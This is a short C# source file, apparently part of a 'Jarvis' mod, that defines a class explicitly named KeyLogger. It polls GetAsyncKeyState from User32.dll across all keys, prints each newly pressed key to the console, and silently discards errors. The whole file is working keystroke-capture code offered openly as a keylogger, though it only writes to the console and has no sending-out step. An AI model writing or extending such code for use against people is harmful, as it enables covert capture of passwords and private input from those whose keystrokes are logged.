using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Jarvis_Mod_Keylogger
{
    public class KeyLogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        public void Read()
        {
            try
            {
                foreach (int i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        Console.Write(Enum.GetName(typeof(Keys), i) + " ");
                        
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
    }
}
